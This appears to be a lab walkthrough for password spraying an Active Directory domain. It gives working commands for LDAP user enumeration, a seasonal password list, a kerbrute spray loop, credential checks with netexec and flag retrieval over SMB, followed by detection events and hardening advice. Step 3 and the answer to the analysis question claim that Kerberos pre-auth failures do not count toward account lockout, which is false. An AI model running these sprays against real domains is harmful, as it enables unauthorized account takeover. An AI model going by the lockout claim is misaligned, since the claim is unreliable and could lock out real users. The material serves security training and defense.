ldapsearch -x -LLL -H ldap://<dc_ip> \
  -D "CORP\j.chen" -w 'Welcome2026#' \
  -b "DC=corp,DC=nordport,DC=local" \
  "(&(objectCategory=person)(objectClass=user))" sAMAccountName \
  | grep -oE 'sAMAccountName: \S+' | awk '{print $2}' > users.txt
wc -l users.txt
Token Effect (&(objectCategory=person)(objectClass=user)) Match user-class person objects only (no computers, no security groups). sAMAccountName Trailing attribute list; only this attribute is returned. grep -oE 'sAMAccountName: \S+' Extract sAMAccountName: value lines (drop everything else from the LDIF). awk '{print $2}' Print just the value (skip the sAMAccountName: prefix). wc -l Count lines. Expect ~275.

If the count is far smaller, your LDAP page size is limiting results. Add -E 'pr=1000/noprompt' for paged results, or use -z 5000 to set a higher size limit.

docs.title: Step 2: Curate a Seasonal Password List
docs.text:
A short curated list of likely passwords beats a giant wordlist for spraying. Each candidate consumes one attempt per account, so you want every entry to have a real chance of hitting. The list below is the seasonal/year/symbol patterns that hit on most internal sprays since 2018.

Kali - Build a seasonal pwlist

cat > pwlist.txt <<'EOF'
Summer2026#
Spring2026#
Winter2026!
Fall2026#
Nordport2026#
Welcome2026#
Password2026#
Cowboys2026!
EOF

The heredoc syntax <<'EOF' (single-quoted EOF) prevents shell variable expansion inside the block; you get the literal lines exactly as typed.

docs.title: Step 3: Spray (One Password at a Time)
docs.text:
Spray with one password against the entire user list, then wait the lockout window before trying the next. kerbrute passwordspray sends Kerberos AS-REQs in parallel; the KDC returns KDC_ERR_PREAUTH_FAILED for wrong passwords (without incrementing badPwdCount) and KRB_AS_REP for hits.

Kali - kerbrute passwordspray for Summer2026#

kerbrute passwordspray --dc <dc_ip> -d corp.nordport.local \
  users.txt 'Summer2026#' \
  -o kerbrute_summer.txt
Flag Effect passwordspray Subcommand: one password against many users (vs bruteforce which is many passwords against one). --dc <ip> Target KDC IP (skip DNS resolution). -d <domain> Realm. <users_file> <password> Positional args: user list, then the single password. -o <file> Write hits ([+] VALID LOGIN) to file.

Each [+] VALID LOGIN line is a hit. Filter to your token:

grep "_${OCR_SCOPE_TOKEN}" kerbrute_summer.txt

The matching account is summer.kowalski_<token>.

If Summer2026# does not yield your hit (test runs may rotate the season), iterate through the rest of pwlist.txt:

while read pw; do
  echo "=== $pw ==="
  kerbrute passwordspray --dc <dc_ip> -d corp.nordport.local users.txt "$pw" 2>/dev/null \
    | grep "VALID LOGIN.*${OCR_SCOPE_TOKEN}"
  sleep 1200   # 20-minute pause between sprays in production
done < pwlist.txt

The sleep 1200 is omitted in this lab (no real users to lock out) but mandatory in production. Twenty minutes per pass is the minimum safe cadence under a 5-attempt / 15-minute lockout policy.

docs.title: Step 4: Validate the Credential
docs.text:
Before chaining further steps, confirm the credential really works against SMB. netexec is the cheapest test: a single negotiate + session setup, then a single line of output.

Kali - Confirm with netexec

netexec smb corp-dc01 -u "summer.kowalski_${OCR_SCOPE_TOKEN}" \
  -p 'Summer2026#' -d corp.nordport.local

Expect [+]. [-] STATUS_LOGON_FAILURE means the password from kerbrute is wrong; re-check your hit lines.

docs.title: Step 5: Read the Token-Scoped Flag
docs.text:
The flag lives in a per-token directory under \\corp-dc01\SprayFlags\<token>\FLAG.txt. The DACL only allows the summer.kowalski_<token> user (and Domain Admins) to read; other students' directories are denied.

Kali - Pull FLAG.txt from your scoped directory

smbclient //corp-dc01/SprayFlags \
  -U "CORP\\summer.kowalski_${OCR_SCOPE_TOKEN}%Summer2026#" \
  -c "cd ${OCR_SCOPE_TOKEN}; get FLAG.txt"
cat FLAG.txt
Token Effect \\\\ (double backslash) Bash escape; renders as \\ for the SMB UNC. -U "DOMAIN\\user%password" Inline cred. The % separator avoids a prompt. -c "cd <dir>; get FLAG.txt" Run two commands and exit; download FLAG.txt to current local dir.

Submit the OCR{...} value.

Common gotchas

  • Lockout misjudgment: in a real environment, omitting sleep 1200 between password passes will lock real users. The lab is configured to skip lockout tracking, but treat the loop as a teaching example, not a copy-paste template for production.
  • kerbrute case sensitivity: kerbrute lowercases usernames before sending. Your users.txt can be mixed case; the KDC normalizes anyway.
  • DC IP vs hostname: --dc accepts either, but DNS through the lab's resolver may fail intermittently. IP is more reliable.
  • Empty hit file: if kerbrute_summer.txt is empty, the password is wrong for everyone in the directory. Try the next candidate; do not assume the spray is broken.

docs.title: Blue Team Perspective
docs.text:
A failed Kerberos pre-auth fires event 4771 on the DC. Volume + same source IP across many accounts is the signature.

Activity Event ID Where it fires Failed Kerberos pre-auth 4771 DC Security log Failed NTLM authentication (netexec) 4625 DC Security log Account lockout (if you go too fast) 4740 DC Security log Defender for Identity "Suspected brute-force attack (Kerberos, NTLM)" MDI

Spray vs lockout signals

Lockout (4740) is the loudest signal because it has a per-account paper trail. A careful operator never triggers it. The detection that catches even a careful spray is volume on 4771: dozens of failed pre-auths from one source IP in one minute, distributed across many accounts. SIEM rule: alert when 4771 events from a single source exceed a baseline-derived threshold across more than 10 distinct accounts.

docs.title: Hardening Note
docs.text:
Spraying targets users. Defenders that block at the user layer (MFA, conditional access, smart-lockout) defeat it without needing per-tool detection.

Spray hardening

  • Enforce MFA on every external authentication surface (VPN, web SSO, federated apps).
  • Roll out passwordless / FIDO2 / Windows Hello for Business to high-value accounts.
  • Enable Smart Account Lockout in Azure AD / Entra ID for cloud-side spraying.
  • Wire Kerberos pre-auth failures into AD lockout policy (closes the kerbrute side door).
  • Build SIEM detections on event 4771 volume per source IP and per-source distinct-username cardinality.
  • Ban known-bad passwords (Azure AD Password Protection, on-prem agent) so seasonal patterns are rejected at password-set time.

docs.title: Record Your Findings
docs.text:
Discovered account:

summer.kowalski_<token>

Cracked password:

Summer2026# (or other seasonal candidate)

Flag:

(OCR{...})

docs.title: Analysis Questions
docs.text:
1. kerbrute passwordspray uses Kerberos AS-REQs. Why does that not increment the lockout counter, and what configuration would change that?

Reveal Answer

Standard AD lockout reads the badPwdCount attribute, which is incremented by the Net Logon service in response to NTLM authentication failures (from SMB binds, LDAP simple binds, RDP attempts, and other NTLM-bearing protocols). Kerberos pre-authentication failures travel a separate path through the KDC; the KDC increments a different per-account counter that, in default Microsoft lockout policy, is not consulted.
